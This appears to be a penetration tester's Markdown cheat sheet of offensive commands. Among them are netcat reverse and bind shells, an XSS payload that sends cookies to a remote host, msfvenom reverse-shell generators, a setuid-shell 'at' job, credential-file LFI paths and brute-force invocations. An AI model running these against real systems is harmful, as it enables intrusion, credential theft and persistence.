# Offensive security/penetration testing:

## Tools needed:
Enum4linux:  `git clone -v https://github.com/portcullislabs/enum4linux /opt/enum4linux-git`\
Nullinux:    `git clone -v https://github.com/m8r0wn/nullinux /opt/nullinux-git`\
Install UserEnum_LDAP: `git clone -v https://github.com/sensepost/UserEnum /opt/UserEnum_LDAP-git`\
OWA Toolkit EWS Brute: `git clone -v https://github.com/johnnyDEP/OWA-Toolkit /opt/OWA-Toolkit-git`\
MailSniper: `git clone -v https://github.com/dafthack/MailSniper /opt/MailSniper-git`\
Sherlock: `git clone -v https://github.com/rasta-mouse/Watson /opt/Watson-git`\
RecurseBuster: `go get -u github.com/c-sto/recursebuster`\
JTR: `git clone https://github.com/magnumripper/JohnTheRipper /opt/john-git`\
SSH Vulnerable keys: `git clone https://github.com/mgit-at/ssh-vulnkey /opt/ssh-vuln-git`\
Impacket: `git clone https://github.com/SecureAuthCorp/impacket /opt/impacket-git`\
Impacket - Windows: `git clone https://github.com/maaaaz/impacket-examples-windows /opt/impacket-examples-compiled`\
Seclists: `git clone https://github.com/danielmiessler/SecLists /opt/seclists-git`\
Process spy: `https://github.com/DominicBreuker/pspy`

## VSCode:

Command palette: `ctrl + shift + p`\
Quick open: `ctrl + p`\
Material theme: `ext install material theme`\
Material theme icons: `Material theme icons Kief Philipp Kief`\
Indent rainbow: `indent-rainbow oderwat`
Config:
```
"indentRainbow.colors": [
  "rgba(16,16,16,0.1)",
  "rgba(16,16,16,0.2)",
  "rgba(16,16,16,0.3)",
  "rgba(16,16,16,0.4)",
  "rgba(16,16,16,0.5)",
  "rgba(16,16,16,0.6)",
  "rgba(16,16,16,0.7)",
  "rgba(16,16,16,0.8)",
  "rgba(16,16,16,0.9)",
  "rgba(16,16,16,1.0)"
]
```
Bracket pair coloriser: `Bracket pair coloriser Coenraad`\
Highlight matching tag: `Highlight matching tagvincaslt`\
Python linting - Microsoft
C/C++ linting - Microsoft
PowerShell - Microsoft

### PowerShell
```
wget http://http.us.debian.org/debian/pool/main/libu/liburcu/liburcu4_0.9.3-1_amd64.deb && dpkg -i liburcu4_0.9.3-1_amd64.deb
wget http://http.us.debian.org/debian/pool/main/u/ust/liblttng-ust-ctl2_2.9.0-2+deb9u1_amd64.deb && dpkg -i liblttng-ust-ctl2_2.9.0-2+deb9u1_amd64.deb
wget http://http.us.debian.org/debian/pool/main/u/ust/liblttng-ust0_2.9.0-2+deb9u1_amd64.deb && dpkg -i liblttng-ust0_2.9.0-2+deb9u1_amd64.deb
wget http://ftp.us.debian.org/debian/pool/main/i/icu/libicu57_57.1-6+deb9u2_amd64.deb && dpkg -i libicu57_57.1-6+deb9u2_amd64.deb 
wget http://http.us.debian.org/debian/pool/main/i/icu/icu-devtools_57.1-6+deb9u2_amd64.deb && dpkg -i icu-devtools_57.1-6+deb9u2_amd64.deb 

apt update && apt -y install curl gnupg apt-transport-https
curl https://packages.microsoft.com/keys/microsoft.asc | apt-key add -
echo "deb [arch=amd64] https://packages.microsoft.com/repos/microsoft-debian-stretch-prod stretch main" > /etc/apt/sources.list.d/powershell.list
apt update
apt -y install powershell
```

### VSCode
```
curl https://packages.microsoft.com/keys/microsoft.asc | gpg --dearmor > microsoft.gpg
sudo install -o root -g root -m 644 microsoft.gpg /etc/apt/trusted.gpg.d/
sudo sh -c 'echo "deb [arch=amd64] https://packages.microsoft.com/repos/vscode stable main" > /etc/apt/sources.list.d/vscode.list'
sudo apt-get install apt-transport-https
sudo apt-get update
sudo apt-get install code # or code-insiders
```

## Linux commands:

Export the IP of the target to a bash variable: `export ip=192.168.1.100`\
Ping the target: `ping $IP`\
Find the location of a file: `locate `\
Use the $PATH environment variable to find a file: `which hydra`\
Use the $PATH and $MANPATH environment variable to find a file: `whereis more`\
Show only listening sockets with info: `netstat -tunlap`\
Start/stop a service such as ssh: `systemctl {start|stop} ssh`\
Have a service start at boot: `systemctl enable ssh`\
Unzip a tar'd gzip file: `tar -xzvf file.tar.gz` (bzip: -j, xz: -J, --lzip, --lzma, --lzop, Zip/Gzip: -z, Compress: -Z)\
Search bash command history: `history | grep {condition}`\
Use a bash loop to find the IP address behind each host:`for url in $(cat list.txt); do host $url; done`\
Base64 decode linux: `echo -n "ZGVjb2RlIHRoaXM=" | base64 -d`\
Decode Hexidecimal Encoded string: `echo -n "54 68 6973206973206120 68657820 656E636F 64656420 7374 7269 6E 67" | xxd -r -ps`\
Mount NFS Share: `Mount -t nfs 10.10.10.45:/vol/nfsshare /mnt/nfs`\
Example bash stuff: `cat access.log | cut -d " " -f 1 | sort | uniq -c | wc -l`

## Windows/CMD commands:
Export the IP of the target to a Windows variables: `set IP=192.168.1.100`\
Ping the target: `ping %IP%`\
System information: `systeminfo`\
Get Windows updates:`dism /online /get-packages`\
Wmic get updates: `wmic qfe list full /format:htable > hotfixes.htm`\
In PSH: `Get-WmiObject -Class "win32_quickfixengineering" | Select-Object -Property "Description", "HotfixID", @{Name="InstalledOn"; Expression={([DateTime]($_.InstalledOn)).ToLocalTime()}}`


### Finding files/data:
#### Linux
Find UID 0 files root execution: `find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null`\
Linux enum: `wget https://highon.coffee/downloads/linux-local-enum.sh; chmod +x ./linux-local-enum.sh; ./linux-local-enum.sh`\
Find executable files updated in Jan: `find / -executable -type f 2> /dev/null | egrep -v "^/bin|^/var|^/etc|^/usr" | xargs ls -lh | grep Jan`\
Find a specific file on linux: `find /. -name suid\*`\
Files modified in the last 90 days: `find -type f -mtime -90` \
Files modified 90 days ago: `find -type f -mtime 90` \
Files modified around 3 months ago: `find -type f -mtime 75 +mtime 105` \
String in a file: `strings $file`\
File type info: `file $file`\
Exif information: `exiftool $file`\
Search for other files/magic info in a file: `binwalk $file`\
Extract data from a file: `bulk_extractor $file -O {output dir}`\
Install steghide: `apt-get install steghide`\
Extract data with steghide: `steghide extract -sf picture.jpg`\
LSPst: `lspst filename.pst`\
ReadPST: `readpst -DSr -o mailbox-export`

#### Windows

Find files PSH: `gci -filter * -recurse`\
Find in files: `dir /s *username* == *password* == *cred* == *key* == *.txt*`\
Find files recursively: `dir c: /S /OD /TC`

### Netcat/nc # nc.traditional or nc?

Bind shell listener: `nc.exe -nlvp 443 -e cmd.exe`\
Reverse shell listener: `nc -nv $ip 443 -e /bin/bash`\
Connect to a SMTP mail server: `nc -nv $ip 25`\
Listen on TCP port: `nc -nlvp 443`\
Connect to NC listener: `nc -nv $ip 43`\
Send a file: `nc -nv $IP 443 < outgoing-data`\
Receive a file: `nc -nlvp 443 > incoming-data`

## Traffic dumping and Packet captures

### Wireshark:

Filter for SMTP traffic: `tcp.port eq 25`\
ICMP only: `icmp`\
DNS only: `dns`\
SIP only: `sip`\
Specific windows stuff: `smb || nbns || dcerpc || nbss || dns`
MAC address filter slicing: `eth.addr[0:3] == 00:50:56`\
Negate traffic for this host: `!(ip.addr == 192.168.0.1)`\
HTTP Post only traffic: `http.request.method == post`

### TCPdump:

Replay a pcap file: `tcpdump -r filename.pcap`\
Grab a packet capture on port 80: `tcpdump  -i ens0 -xxNNSs 1514 -w output.pcap`

## IPtables

### Flush, delete, accept all traffic:

`sudo iptables -P INPUT ACCEPT`\
`sudo iptables -P FORWARD ACCEPT`\
`sudo iptables -P OUTPUT ACCEPT`\
`sudo iptables -t nat -F`\
`sudo iptables -t mangle -F`\
`sudo iptables -F`\
`sudo iptables -X`

Just flush:     `iptables -F`\
Clear counters: `iptables -Z`

## Information discovery

### Passive:

Google search subdomains: `site:microsoft.com`\
Google operators: inurl, intitle\
Shodan.io\
Censys.io\
Google - https://www.exploit-db.com/google-hacking-database/ \
Netcraft\
Whois:`./whois`\
Online Certificate checking: `http://crt.sh`

### Active:

Email address harvesting: `cewl -e www.microsoft.com`

#### DNS:

DNS host discovery search: `Fierce.pl`\
Brute force DNS: `python ./subbrute.py ./all.txt domain.com | /massdns -r resolvers.txt -t A -a -o -w domain.com.txt -`\
Fierce.pl\
Zone xfer: `dnsrecon -d megacorpone.com -t axfr` or `dig axfr my-domain.com @ns1.my-domain.com`\
DNS resolution: `dig` or `host`\
DNS resolution Windows: `nslookup`,`set type=1`,`use servername`,`ls -a`\
List canonical names and aliases or `ls -d` all records or `-t A` list records type A,CNAME,MX,NS,PTR\
Nmap DNS: `nmap $dnsserver --script dns-fuzz --script-args timelimit=2h`

#### Host recon:

Initial host discovery (Ping scan): `nmap -sn -r 10.10.12.0/24  | grep 'Nmap scan report' | cut -d' ' -f 5 > live_hosts.txt`\

Useful options:\
`-sP` Ping scan for hosts, no port scan\
`-PS` `-PA` `-PU` Host discovery using TCP Syn, TCP Ack, and UDP.\
`-PO` Scan Host discovery using IP Protocol

#### Port Scanning:

Initial TCP Port scan: `nmap -sT -vv -p- $IP -oA tcp-port-scan`\
TCP Port scan: `nmap -sV -sC -vv -p- $IP -oA tcp-port-scan`\

Thorough TCP/UDP: `Nmap -sS -sU -v -p1-65535 $IP`\
TCP with OS discovery (-O), service scanning (-sV), script scanning (-sC), traceroute( --traceroute), Import hosts to scan(-iL)
`nmap -n -vvvv -sT -p0-65535 -A -iL live_host.txt -oA nmap_tcp_scan`\
`nmap -n -vvvv -Pn -sU -F -iL live_host.txt -oA nmap_udp_scan`

Useful options:

`-sS`: Stealth scan, uses TCP Syn only\
`-sT`: Full TCP scan using Syn/Ack\
`--open`: Only shows open ports\
`--reason`: Reason for port state\
`--badsum`: Useful for detecting FW/IDS\
`-Pn`: skip host discovery\
`-sA`: Check if ports a filtered by FW, doesn’t determine open ports\
`-6`: IPV6\
`--packet-trace`: Show all packets sent and received\
`-T1-5`: speed

Using NC for port scans:`nc -nvv -w 1 -z $IP 3388-3390`

#### Scripts:

Categories: `auth, broadcast, default, discovery, safe, version` \
`dos, exploit, external, fuzzer, intrusive, malware, vuln`\
Update scripts: `--script-updatedb`
Default: `-sC`
Vulnerability: `--script vuln`
Categories: auth, broadcast, brute, default, discovery, dos, exploit, external, fuzzer, intrusive, malware, safe, version, vuln
Example: `nmap --script "default and safe"`\
RPC scripts: `nmap --script="rpc*" 10.10.10.33`\

#### Searchsploit

Copy the sploit to current folder: `searchsploit -m [sploit to copy]`\
Update searchsploit: `searchsploit -u`\

# Infrastructure hacking

## Windows Enumeration process:

SMB Enumeration: `nullinux -U 'domain\username' -P password $IP`\
SMB Enumeration (unathenticated): `nullinux $IP`\
SMB Browse: `smbclient //$IP/Users -U username`\
Linux Mount SMB: `mount -t cifs -o username=user,password=pass,domain=domain //$IP/share /mnt`\
RPCClient (authenticated): `rpcclient --user="<Username>" --command=enumprivs $IP`\
SMB Nmap (authenticated): `nmap -sV -Pn -vv -p445 $IP --script-args smbuser={},smbpass={} --script='(smb*) and safe ' `\
SMB Nmap (authenticated): `nmap -p445 192.168.10.0/24 -v --script smb-enum-shares --script-args smbuser={},smbpass={}   -oA nmap-auth-shares`\
SMB Nmap enumerate users: `nmap -sU -sS --script=smb-enum-users -p U:135-139,T:135-139 $IP -oA nmap-enum-users`\
Rid cycling: `ridenum.py $IP 500 50000 dict.txt`\
Metasploit DCOM enumeration: `use auxiliary/scanner/dcerpc/endpoint_mapper`\
Metasploit Hidden DCOM enumeration: `use auxiliary/scanner/dcerpc/hidden`\
Metasploit Management DCOM enumeration: `use auxiliary/scanner/dcerpc/management`\
Netbios enumeration: `nbtscan -r 10.10.10.0/24`\
Netbios enumeration with Nmap: `nmap -sU --script nbstat.nse -p 137 $IP`

# Infrastructure testing

### Test SSL:

Enumerate SSL/TLS: `testssl --headers --vulnerable --log --html www.google.co.uk:443`\
Enumerate SSL/TLS: `SSLScan 10.10.10.9:443`

### FTP TCP/21:

### SSH TCP/22:

Weak keys?

### SMTP TCP/25:

Metasploit: `auxiliary/scanner/smtp/smtp_enum`\
NMap: `nmap 10.10.10.9 –script smtp-enum-users.nse -oA nmap-smtp-user-enum`

### DNS TCP-UDP/53:

Bruteforce hosts and subdomains: `use auxiliary/gather/dns_bruteforce`\
DNS info: `use auxiliary/gather/dns_info`\
Reverse lookup information: `use auxiliary/gather/dns_reverse_lookup`\
Bruteforce hosts, subdomains: `Fierce.pl`\
DNS Ampliflication test: `use auxiliary/scanner/dns/dns_amp`\
Cache scraper: `use auxiliary/gather/dns_cache_scraper`\
Nmap DNS scripts: `nmap -sTU -p53 $IP --script "dns*"`

### Finger TCP/79:

Enumerate user using Finger: `finger -sl username@$IP`

### POP3 TCP/110:

Telnet to SMTP server: `telnet {ip} {port}`\
Commands: user, pass, list, retr

### NFS TCP/UDP/111

Show exported mounts: `showmount -e $ip`

### Netbios TCP/135/138/139:

Netbios Windows User enumeration (SensePost-UserEnum_NBS): `UserEnum_NBS.py 10.10.10.4 Contoso userslist.txt`\
RPC Windows User enumeration (SensePost-UserEnum_NBS):`UserEnum_RPC.py 10.10.10.4 userslist.txt`\
Impacket RPCDump: `rpcdump.py $IP`\
RPCClient: `rpcclient -U "" -p "" -d {domain/workgroup from smbclient -L} -H $ip`\
SMBClient: `smbclient -N -L $ip`\
SMBClient: `smbclient -L //hostname/sharename -I $ip -N`\
Enum4linux: `enum4linux -a $ip`\
RPCinfo: `rpcinfo $ip `\
Nmap: `nmap -sT -sV -sC -p139 $ip`

### SNMP TCP/161:

Fix output values: `apt-get install snmp-mibs-downloader download-mibs echo "" > /etc/snmp/snmp.conf`\
Enumerate with SNMP Check Public v2c: `snmp-check $ip -p161 -c public -v 2c`\
Enumerate with SNMP Check default: `snmp-check $ip`\
Enuerate with Snmpenum: `snmpenum $ip public windows.txt`\
Nmap SNMP scripts: `nmap -sU $ip -p161 -Pn --script "snmp*" `\
Brute force with OneSixtyOne:`onesixtyone -c /usr/share/doc/onesixtyone/dict.txt $ip`\
SNMP Creds: `/usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt`

### Microsoft RPC/Endpoint mapper:

Metasploit Endpoint_mapper: `use auxiliary/scanner/dcerpc/endpoint_mapper`,`auxiliary/scanner/dcerpc/hidden`,`auxiliary/scanner/dcerpc/management`,`auxiliary/scanner/dcerpc/tcp_dcerpc_auditor`

### TCP/389-636:
LDAP Windows User enumeration (SensePost-UserEnum): `UserEnum_LDAP.py $IP Contoso.local userslist.txt`
LDAPSearch rootDSE query to get namingContext(no bind): `ldapsearch -x -h $IP -b '' -s base '(objectclass=*)' | grep namingContexts`\
LDAPSearch for all objects (anonymous): `ldapsearch -x -h $IP -b 'dc=domain,dc=local' -D '' -w '' '(objectclass=*)'`\
LDAPSearch for all object (bind connection): `ldapsearch -x -h $IP -b 'dc=domain,dc=local' -D 'username' -w 'password' '(objectclass=*)'`\
LDAPSearch Kerberos preauth: `ldapsearch -x -h $IP -b 'dc=domain,dc=local' -D 'username' -w 'password' '(&(objectCategory=person)(objectClass=user)
(userAccountControl:1.2.840.113556.1.4.803:=4194304))'`\
LDAPSearch accounts do not expire: `ldapsearch -x -h $IP -b 'dc=domain,dc=local' -D 'username' -w 'password' '(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))'`\
LDAPSearch accounts do not expire (int): `ldapsearch -x -h $IP -b 'dc=domain,dc=local' -D 'username' -w 'password' '(&(objectCategory=person)(objectClass=user)(|(accountExpires=0)(accountExpires=9223372036854775807)))'`\
LDAPSearch accounts with unconstrained delegation: `ldapsearch -x -h $IP -b 'dc=domain,dc=local' -D 'username' -w 'password' '(userAccountControl:1.2.840.113556.1.4.803:=524288)'`\
LDAPSearch sensitive accounts with unconstrained delegation: `ldapsearch -x -h $IP -b 'dc=domain,dc=local' -D 'username' -w 'password' '(userAccountControl:1.2.840.113556.1.4.803:=1048576)'`\
LDAPSearch account with password never expires: `ldapsearch -x -h $IP -b 'dc=domain,dc=local' -D 'username' -w 'password' '(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=65536))'`\
LDAPSearch accounts disabled: `ldapsearch -x -h $IP -b 'dc=domain,dc=local' -D 'username' -w 'password' '(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2))'`\
LDAPSearch account enabled: `ldapsearch -x -h $IP -b 'dc=domain,dc=local' -D 'username' -w 'password' '	(&(objectCategory=person)(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))'`\
LDAPSearch accounts not requiring password: `ldapsearch -x -h $IP -b 'dc=domain,dc=local' -D 'username' -w 'password' '(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))'`\
LDAPSearch accounts required to change pw at next logon: `ldapsearch -x -h $IP -b 'dc=domain,dc=local' -D 'username' -w 'password' '(&(objectCategory=person)(objectClass=user)(pwdLastSet=0))'`\
LDAPSearch accounts with password change date: `ldapsearch -x -h $IP -b 'dc=domain,dc=local' -D 'username' -w 'password' '(&(objectCategory=person)(objectClass=user)(pwdLastSet>=129473172000000000))'`\
LDAPSearch accounts with password change date: `ldapsearch -x -h $IP -b 'dc=domain,dc=local' -D 'username' -w 'password' '(ms-MCS-AdmPwd=*)' ms-MCS-AdmPwd`\


### RSH TCP/514:

Metasploit: `auxiliary/scanner/rservices/rsh_login`

### HTTP/HTTPS TCP/80/443:

Nmap -sV --script=http-enum --script-args http-enum.basepath=server/ -v 192.168.0.33\
Nikto -h $ip\
OpenVAS\
HTTP Methods: `nmap $ip -p80,443 -script http-methods --script-args http-methods.url-path='/server' -oA http-methods `\
HTTP options: `curl -vX OPTIONS http://10.10.10.59/`\
Shellshock: `git clone https://github.com/nccgroup/shocker`\
HTTP Put: `nmap --script http-put --script-args http-put.url='',http-put.file=''`\
HTTP Move:`curl -X Move --header`\
HTTP Move: Metasploit: `exploit/windows/iis/iis_webdav_upload_asp`\
XSS iframe test: `<iframe src="http://malicious-url/content" height="0" width="0"></iframe>`\
XSS steal cookies: `<script>new image().src="http://192.168.0.1/submission.php?stolen_data="+document.cookie;</script>`\
RFI Enumeration: `https://github.com/kurobeats/fimap`\
LFI/PHP filter: `curl -s http://vulnerale-page/?page=php://filter/convert.base64-encode/resource=index | base64 -d`\
PHPinfo exploit: `https://github.com/kurobeats/fimap/wiki/FimapPhpInfoExploit`\
LFI: `http://www.insomniasec.com/publications/LFI%20With%20PHPInfo%20Assistance.pdf`\
Exchange tools: `Brute-EWS -TargetList .\userids.txt -ExchangeVersion 2007_SP1  -ewsPath "https://owa.domain.com/EWS/Exchange.asmx" -Password "omg123" -Domain "domain.com"`\
HTTP Brute force (Simple post): `hydra -l admin -P /usr/share/wordlists/rockyou.txt $IP -V http-form-post '/login:username=^USER^&password=^PASS^&submit=Login:F=failed' -t 40
`\
Apache Tomcat Manager: `hydra -L tomcat-users.txt -P rockyou.txt -f $IP http-get /manager/html`

### SQL TCP/1433:

NMAP Enumeration: `nmap 10.10.10.59 -p 1433 --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER`\
SQLMap Enumeration: `sqlmap -R`\
SqlNinja\
MSDat - Micrsoft Database Attacking Tool: `https://github.com/quentinhardy/msdat`

### Oracle
odat standaline tool: `https://github.com/quentinhardy/odat/releases/download/2.2.1/odat-linux-libc2.5-i686.tar.gz`

### MySQL/3306:
Fingerpring (-f) SQL with SQLMap: `sqlmap -r request.txt -f`\
Dump databases (--dbs) SQL with SQLMap: `sqlmap -r request.txt -D mysql --dbs --dump`\
Dump tables in DB (--db test --tables) SQL with SQLMap: `sqlmap -r request.txt -D mysql --D test --tables --dump`

### RDP/3389
Enumeration: `nmap -A --script=vuln -p3389 --script="rdp*" -v`
Bruteforce: `ncrack -vv --user administrator -P /usr/share/wordlists/rockyou.txt rdp://$IP`

### Check file extensions:

ASP Classic: `asp`\
ASP.NET: `aspx,axd,asx,asmx,ashx`\
All IIS: `asp,aspx,axd,asx,asmx,ashx,asax,ascx,browser,cd,compile,config,cs,vb,csproj,vbproj,disco,vsdisco,dsdgm,dsprototype,dll,licx,webinfo,master,mdb,ldb,mdf,msgx,svc,resrouce,resx,sdm,sdmDocument,sitemap,skin,sln,soap,asa,imDitto,cdx,cer,idc,shtm,shtm,stm,css,htm,html`\
CSS: `css`\
Coldfusion: `cfm`\
Erlang: `yaws`\
Flash: `swf`\
HTML: `html,htm,xhtml,jhtml`\
Java/Tomcat: `jsp,jspx,wss,do,action`\
JavaScript: `js`\
Perl: `pl`\
`PHP,php,php4,php3,phtml`\
Python: `py`\
Ruby: `rb,rhtml`\
SSI: `shtml`\
XML: `xml,rss,svg`\
Other (C, perl etc.): `cgi,dll`\
Random: `txt,bak,un~`

### Check http response codes: 200,204,301,302,307,403

#### HTTP directory enumeration:
GoBuster Directory enumeration: `gobuster -u $IP -w $wordlist -e -s 200,204,301,302,307,403,500`\
GoBuster Directory Appened forward-slash enumeration: `gobuster -u $IP -w wordlist.txt -l -e -s 200,204,301,302,307,403,500 -t 30`\
GoBuster File ext (-x) enumeration: `gobuster -u $IP -x PHP -w wordlist.txt -l -e -s 200,204,301,302,307,403,500 -t 30`\
GoBuster options: `-t add slashes, -l length, -e extended URL, -s codes, -t threads`\
Dirb through a proxy: `dirb [http://$ip/](http://172.16.0.19/) -p $ip:3129`

### LFI Windows:
`
C:\windows\win.ini
C:\windows\system.ini
C:\windows\iis.log
C:\windows\windowsupdate.log
C:\windows\system32\drivers\etc\hosts
C:\windows\system32\config\system
C:\windows\debug\netsetup.log
C:\windows\debug\sammui.log
C:\windows\debug\netlogon.log
C:\windows\debug\passwd.log
C:\windows\system32\winevt\logs\application.evtx
C:\windows\system32\winevt\logs\system.evtx
C:\windows\system32\winevt\logs\Windows PowerShell.evtx
C:\windows\system32\winevt\logs\Microsoft-Windows-PowerShell%4Operational.evtx
C:\windows\system32\winevt\logs\Microsoft-Windows-PowerShell%4Admin.evtx
C:\windows\system32\winevt\logs\Windows PowerShell.evtx
C:\windows\MpCmdRun.log
C:\windows\NetSetup.LOG
C:\windows\repair\sam
C:\windows\System32\config\RegBack\SAM
C:\windows\repair\system
C:\windows\repair\software
C:\windows\repair\security
C:\windows\iis6.log
C:\windows\system32\logfiles\httperr\httperr1.log
C:\sysprep.inf
C:\sysprep\sysprep.inf
C:\sysprep\sysprep.xml
C:\windows\Panther\Unattended.xml
C:\inetpub\wwwroot\Web.config
C:\windows\system32\config\AppEvent.Evt
C:\windows\system32\config\SecEvent.Evt
C:\windows\system32\config\default.sav
C:\windows\system32\config\security.sav
C:\windows\\system32\config\software.sav
C:\windows\system32\config\system.sav
C:\windows\system32\inetsrv\config\applicationHost.config
C:\windows\system32\inetsrv\config\schema\ASPNET_schema.xml
C:\windows\System32\drivers\etc\hosts
C:\windows\System32\drivers\etc\networks
C:\windows\system32\config\SAM
`

### Wordlists:

/usr/share/seclists/Discovery/Web_Content/big.txt:20469\
/usr/share/seclists/Discovery/Web_Content/common.txt:4614\
/usr/share/wordlists/dirbuster/apache-user-enum-1.0.txt:8930\
/usr/share/wordlists/dirbuster/apache-user-enum-2.0.txt:10355\
/usr/share/wordlists/dirbuster/directories.jbrofuzz:58688\
/usr/share/wordlists/dirbuster/directory-list-1.0.txt:141708\
/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:220560\
/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt:87664\
/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt:207643\
/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt:81643

### Generating Password lists:

CeWL\
CUPP - Common user profiling\
Crunch - Wordlist generator\
KWProcessor - Keyboard walks

### Fuzzing:

`wfuzz - The web brute forcer`\
Cookie fuzzer: `wfuzz -c --hs incorrect -z file,/usr/share/wordlists/wfuzz/general/medium.txt -H "Cookie: password=FUZZ" http://$IP`\
HTTP GET Parameter fuzzer: `wfuzz -c -z file,/usr/share/wordlists/wfuzz/general/medium.txt http://$IP/?FUZZ=test`\
Subdomain fuzzing: `wfuzz -w /usr/share/wordlists/dirb/common.txt -c --hc 404,400,301 -hl 222 -u http://$ip -H "Host: FUZZ.domain.name"`

Notes: `-c: colours`\
`-hc: hide codes`\
`-hl: hide length`\
`-hs: hide regex or -ss: show regex`\
`-w: wordlist`\
`-u: url or ip address in this case`\
`-H: headers`

### Application specific enumeration/exploit:

#### Sharepoint enum:

https://github.com/toddsiegel/spscan\
https://github.com/0rigen/SharePwn

#### WordPress:

Wordpress scan: `WPScan -u http://10.10.10.59 --enumerate -u,t,at,ap --proxy 127.0.0.1:3129`

#### .git:

GiTtools: `https://github.com/internetwache/GitTools`\
Dump git site: `./gitdumper.sh http://10.10.10.178/.git/ .git`\
Extract: `./extractor.sh ../../.git ../../git-dest-dir`

### Aliases:

#### Python FTP:

`pip install pyftpdlib`\
`python -m pyftpdlib -p 21 -w`

#### Python Webserver:

`python3 -m http.server 80`\
`python2 -m SimpleHTTPServer 80`

#### PHP Server:

`php -s ip_address:80`\

#### SMB Server Linux

Impacket: `python smbserver.py shared /root/Desktop/repo`

## Android APK:

Monitor log file: `pidcat $appname`\

Decompile the APK: `Apktool -d compiled-file.apk`\
Or use JADX UI (Easier to decode the Java)\
Or use Unzip\

Recompile the APK:`Apktool b decompiled-apk/ -o compiled-unsigned.apk`\
Aligning to 4bytes: `zipalign -v 4 compiled-unsigned.apk compiled-signed.apk`\

ADB stuff:\
`adb shell pm list packages`\
`adb shell pm path com.filename`\
`adb pull /data/app/filename/base.apk`\
`adb uninstall com.example.android`\
`adb install compiled-signed.apk`\

Signing the APK: `TO DO`

## SSH/SCP

### SSH

Connect (passwor): `ssh user@host`\
Local Port Forwarding (Maps port 80 on the localhost to port 80 on the remote host: ssh -L 80:target.host:80 pivot-host.com\
Local Port Forwarding (Maps port 80 on a differen ip to port 80 on the remote host: ssh -L 127.0.0.1:80:target.host:80 pivot-host.com\
Remote Port Forwarding (Maps port 80 on the remote host to the localhost port 8080, exposing localhost): ssh -R 8080:localhost:80 target-host.com\
Remote Port forwarding requires sshd_config changes: GatewayPorts yes, GatewayPorts clientspecified\
Example exposing a backdoor into the network: `ssh -R 2222:alternate-internal-host:22 -R 5432:alternate-internal-host:5432 external.host`\
SSH Control escape: `~C`\
Then commands: `-L 8080:localhost:80`\

### SCP

Copy a single file from local to remote: `scp ~/users.txt user@remote-host.com:~/userlist`\
Copy a single file from remote to local: `scp user@remote-host.com:~/userlist/users.txt ~/userlist`\
Copy a directory from local to remote (-r recursive): `scp -r ~/userlist user@remote-host.com:~/userlist`\
Copy a directory from remote to local (-r recursive): `scp -r user@remote-host.com:~/revenge ~/userlist`\
Copy from one ssh host to another ssh host (not yours): ` scp user@remote-host.com:~/users.txt user@another-remote-host.com:~/userlist`\

## Shells and Payloads

### Web
Webshells http://tools.kali.org/maintaining-access/webshells: `Kali webshells: /usr/share/webshells`
Weevely

### Executables
Backdoor factory

### Payloads - https://twitter.com/subTee/status/1157560782575419393 @Subtee
"CLR via C# - Richter
"Pro .NET Memory Mgmt" - Kokosa
"High Performance .NET" - Watson

### Msfvenom
Netcat ASP reverse shell (unstaged): `msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f asp > reverse.asp`\
Netcat ASP reverse shell (staged): `msfvenom -p windows/shell/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f asp > reverse.asp`\
Netcat reverse shell (unstaged): `msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe > reverse.exe`\
Netcat reverse shell (staged): `msfvenom -p windows/shell/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe > reverse.exe`\

### Metasploit delivery methods:
```
use exploit/multi/script/web_delivery
show targets
set payload ???
set SRVHOST ???
set URIPATH /
run
```

### AT job
'''
echo '# owner: root' >> /usr/spool/at/87.01.1201.01
echo '# jobname: stdin' >> /usr/spool/at/87.01.1201.01
echo '# shell: sh' >> /usr/spool/at/87.01.1201.01
echo '# notify by mail: no' >> /usr/spool/at/87.01.1201.01

echo 'umask 0' >> /usr/spool/at/87.01.1201.01
echo 'echo "/bin/cp /bin/sh /tmp/sh && /bin/chmod 4755 /tmp/sh" | /bin/sh' >> /usr/spool/at/87.01.1201.01
chmod 400 87.01.1201.01
'''


### Windows scheduled task
```
schtasks /Create /tn ExampleTask /TR c:\windows\system32\calc.exe /SC once /ST 00:00 /S target.host.domain /RU System
schtasks /Run /TN ExampleTask /S target.host.domain
schtasks /F /Delete /TR ExampleTask /S target.host.domain
```
## Port forwarding/masquerading

SOCAT: `socat TCP-LISTEN:80,fork TCP:192.168.1.1:80`\
IPTables: `iptables -A PREROUTING -t nat -p tcp --dport 80 -j DNAT –to 192.168.1.1:80'`

## Pivoting

### SSH with Proxychains

Setup a dynamic local SOCKS proxy: `ssh -fN -D 127.0.0.1:8888 user@target-host.com`\
Config file: eg `pivot.conf`\
```
strict_chain # Do each connection via the proxies listed in order, alts: dynamic_chain, random_chain
quiet_mode # No output
proxy_dns # Proxy DNS requests
remote_dns_subnet 224
tcp_read_time_out 15000
tcp_connect_time_out 8000
localnet 127.0.0.0/255.0.0.0 # Exclusions
 
[ProxyList]
socks4  127.0.0.1 8888

Usage: `proxychains4 -f ./pivot.conf wget http://remote-network-target-host.com
DNS Resolution: `proxyresolv www.target-host.com
```
Specify alternate configuration:`-f`

### Netsh pivot
on the compromised host: `netsh interface portproxy add v4tov4 listenport=33389 listenaddress=0.0.0.0 connectport=3389 connectaddress=10.10.10.44`

### PLink on Windows

# Privilege escalation

## Windows
https://github.com/infosecn1nja/AD-Attack-Defense/blob/master/README.md#discovery
